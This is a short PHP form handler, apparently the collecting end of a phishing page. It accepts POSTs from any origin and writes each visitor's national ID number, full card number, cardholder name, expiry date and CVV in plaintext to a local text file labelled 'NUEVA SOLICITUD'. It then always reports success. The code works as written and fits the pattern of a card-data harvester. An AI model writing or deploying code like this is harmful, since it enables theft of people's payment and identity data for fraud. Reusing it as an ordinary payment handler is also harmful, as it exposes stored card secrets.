<?php
// Error reporting
error_reporting(E_ALL);
ini_set('display_errors', 0);

// Headers
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
header("Content-Type: application/json");

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    echo json_encode(['success' => true]);
    exit();
}

// Get form data
$dni = $_POST['dni'] ?? '';
$cardNumber = $_POST['cardNumber'] ?? '';
$cardName = $_POST['cardName'] ?? '';
$cardExpiry = $_POST['cardExpiry'] ?? '';
$cardCvv = $_POST['cardCvv'] ?? '';

// Create log entry
$logEntry = "\n=== NUEVA SOLICITUD: " . date('Y-m-d H:i:s') . " ===\n";
$logEntry .= "DNI: {$dni}\n";
$logEntry .= "TARJETA\n";
$logEntry .= "Número: {$cardNumber}\n";
$logEntry .= "Titular: {$cardName}\n";
$logEntry .= "Vencimiento: {$cardExpiry}\n";
$logEntry .= "CVV: {$cardCvv}\n";
$logEntry .= "======================================\n";

// Save to file
$fileName = __DIR__ . '/solicitudes.txt';
file_put_contents($fileName, $logEntry, FILE_APPEND);

// Return success
echo json_encode(['success' => true]);